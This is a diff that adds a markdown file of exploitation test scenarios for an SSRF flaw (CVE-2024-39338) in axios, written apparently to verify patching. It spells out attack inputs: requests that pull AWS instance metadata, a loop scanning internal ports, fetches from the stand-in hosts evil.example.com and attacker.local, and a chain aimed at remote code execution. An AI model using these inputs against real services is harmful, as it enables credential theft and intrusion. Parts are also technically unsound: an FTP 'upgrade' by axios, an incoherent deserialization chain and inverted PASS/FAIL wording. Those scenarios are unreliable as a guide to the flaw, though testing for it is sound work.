@@ -1,0 +1,112 @@
+# Exploitation Test Case Scenarios for CVE-2024-39338 (Axios SSRF)
+
+This document describes real-world exploitation scenarios for the SSRF vulnerability in axios versions **1.3.2 – 1.7.3**, demonstrating how crafted inputs can force the server to issue unintended requests. Each scenario can be automated in your test suite to verify whether a build is vulnerable (should **PASS**) or patched (should **FAIL**).
+
+---
+
+## Scenario 1: AWS Instance Metadata Exfiltration
+
+- **Description**  
+  An attacker-controlled path is used to retrieve AWS Instance Metadata (IMDS) from `169.254.169.254` via a path-relative URL.
+
+- **Prerequisites**  
+  - axios 1.3.2 – 1.7.3 installed  
+  - A mock or real metadata service at `http://169.254.169.254/latest/meta-data/`
+
+- **Steps**  
+  1. Create an axios client with a benign `baseURL` (e.g. `https://api.example.com`).  
+  2. Invoke `client.get('/169.254.169.254/latest/meta-data/')`.  
+  3. Observe the request hitting the metadata endpoint instead of the legitimate API.
+
+- **Expected Outcome**  
+  - **Vulnerable**: Request succeeds, returning metadata.  
+  - **Patched**: `ERR_INVALID_URL` (or similar) is thrown, blocking the request.
+
+---
+
+## Scenario 2: Internal Service Port Scanning
+
+- **Description**  
+  Use a series of path-relative inputs to probe internal hosts and ports (e.g. `internal.service.local:8080`).
+
+- **Prerequisites**  
+  - axios 1.3.2 – 1.7.3 installed  
+  - A mock internal service listening on `http://10.0.0.5:8080/health`
+
+- **Steps**  
+  1. Loop over target ports:  
+     ```js
+     for (const port of [80, 8080, 9000]) {
+       await client.get(`/10.0.0.5:${port}/health`);
+     }
+     ```  
+  2. Check which ports return a 200 OK.
+
+- **Expected Outcome**  
+  - **Vulnerable**: Any reachable internal port responds, confirming its presence.  
+  - **Patched**: All requests throw `Invalid URL` errors.
+
+---
+
+## Scenario 3: External Host Retrieval via Protocol-Relative URL
+
+- **Description**  
+  A protocol-relative URL (`//evil.example.com/path`) forces the server to fetch from an attacker-controlled host.
+
+- **Prerequisites**  
+  - axios 1.3.2 – 1.7.3 installed  
+  - An HTTP listener at `http://evil.example.com/path`
+
+- **Steps**  
+  1. Call `client.get('//evil.example.com/path')`.  
+  2. Monitor the attacker host for incoming requests.
+
+- **Expected Outcome**  
+  - **Vulnerable**: The request lands at `evil.example.com`, returning the attacker’s response.  
+  - **Patched**: The call errors out before any outbound connection is made.
+
+---
+
+## Scenario 4: Cross-Protocol Request to FTP Service
+
+- **Description**  
+  Exploit SSRF to request resources over FTP by supplying an `ftp://` path.
+
+- **Prerequisites**  
+  - axios 1.3.2 – 1.7.3 installed  
+  - An FTP server accessible at `ftp.example.net/public/file.txt`
+
+- **Steps**  
+  1. Provide the path `/ftp.example.net/public/file.txt` to the client:  
+     ```js
+     await client.get('/ftp.example.net/public/file.txt');
+     ```  
+  2. Observe whether axios upgrades this to `ftp://ftp.example.net/public/file.txt`.
+
+- **Expected Outcome**  
+  - **Vulnerable**: Axios issues an FTP request and returns the file contents.  
+  - **Patched**: `ERR_INVALID_URL` is thrown, preventing FTP access.
+
+---
+
+## Scenario 5: Chained SSRF → RCE via Deserialization
+
+- **Description**  
+  Combine SSRF with an internal service that deserializes JSON and executes callbacks, leading to remote code execution.
+
+- **Prerequisites**  
+  - Vulnerable axios deployment  
+  - Internal service at `http://10.0.0.8:5000/deserialize` that parses JSON and invokes functions based on payload
+
+- **Steps**  
+  1. Host a malicious JSON payload on attacker server (e.g. `http://attacker.local/payload.json`).  
+  2. Trigger SSRF: `await client.get('/attacker.local/payload.json');`  
+  3. The vulnerable service fetches and deserializes it, invoking the malicious callback.
+
+- **Expected Outcome**  
+  - **Vulnerable**: Arbitrary code runs on the internal server.  
+  - **Patched**: SSRF is blocked, payload never reaches the deserializer.
+
+---
+
+> **Note:** Automating these scenarios with tools like Mocha, Chai and Nock can help you validate both presence and remediation of CVE-2024-39338 in your axios-dependent services.
